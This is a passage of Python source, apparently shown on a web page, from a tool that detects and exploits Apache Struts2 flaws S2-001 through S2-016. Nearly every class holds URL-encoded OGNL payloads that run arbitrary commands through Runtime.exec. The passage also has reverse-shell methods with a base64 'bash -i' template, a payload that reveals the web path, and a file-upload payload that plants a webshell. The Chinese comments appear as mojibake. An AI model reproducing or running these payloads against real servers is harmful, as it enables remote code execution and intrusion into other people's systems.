html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-001&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.web_path)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_003:</span><br><span class="line">    &quot;&quot;&quot;S2-003æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-003:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.11.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ&quot;</span><br><span class="line">    exec_payload = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-003&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_005:</span><br><span class="line">    &quot;&quot;&quot;S2-005æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-005:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.1.8.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ&quot;</span><br><span class="line">    web_path = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&quot;</span><br><span class="line">    exec_payload1 = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line">    exec_payload2 = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27&#123;cmd&#125;%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        self.exec_payload = self.exec_payload1</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-005&#x27;</span><br><span class="line">        else:</span><br><span class="line">            self.exec_payload = self.exec_payload2</span><br><span class="line">            html = echo_check(self)</span><br><span class="line">            if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                return html</span><br><span class="line">            if html:</span><br><span class="line">                self.is_vul = True</span><br><span class="line">                return &#x27;S2-005&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_007:</span><br><span class="line">    &quot;&quot;&quot;S2-007æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-007:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.2.3; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;&#x27;%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))%20%2B%20&#x27;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-007&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_008:</span><br><span class="line">    &quot;&quot;&quot;S2-008æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-008:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29)&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-008&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_009:</span><br><span class="line">    &quot;&quot;&quot;S2-009æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-009:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.1.1; GETè¯·æ±‚å‘é€æ•°æ®,URLåé¢éœ€è¦è¯·æ±‚å‚æ•°å; é»˜è®¤ä¸º: key; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27&#123;cmd&#125;%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(&#123;key&#125;)(%27meh%27)]&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;key&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data.split(&#x27;=&#x27;)[0].strip()</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-009&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), key=self.data)</span><br><span class="line">        html = get(self.url + &quot;&amp;&#123;key&#125;=&#123;payload&#125;&quot;.format(key=self.data, payload=payload), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_012:</span><br><span class="line">    &quot;&quot;&quot;S2-012æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-012:å½±å“ç‰ˆæœ¬Struts Showcase App 2.0.0-2.3.13; GETè¯·æ±‚å‘é€æ•°æ®,å‚æ•°ç›´æ¥æ·»åŠ åˆ°URLåé¢; é»˜è®¤ä¸º:name; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-012&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_013:</span><br><span class="line">    &quot;&quot;&quot;S2-013/S2-014æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-013/S2-014:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D&quot;</span><br><span class="line">    upload_paylaod = &quot;$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-013&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.web_path), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&#123;t&#125;&amp;f=&#123;f&#125;&quot;.format(t=quote(shell), f=upload_path)</span><br><span class="line">        html = post(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.upload_paylaod), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_015:</span><br><span class="line">    &quot;&quot;&quot;S2-015æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-015:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())%2C%23q%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-015&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &quot;&#123;payload&#125;.action&quot;.format(payload=payload), self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return html</span><br><span class="line">        try:</span><br><span class="line">            soup = BeautifulSoup(html, &#x27;lxml&#x27;)</span><br><span class="line">            ps = soup.find_all(&#x27;p&#x27;)</span><br><span class="line">            result = unquote(ps[1].text[9:-4]).strip()</span><br><span class="line">            return result</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_016:</span><br><span class="line">    &quot;&quot;&quot;S2-016æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-016:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    check_poc = &quot;redirect%3A%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = 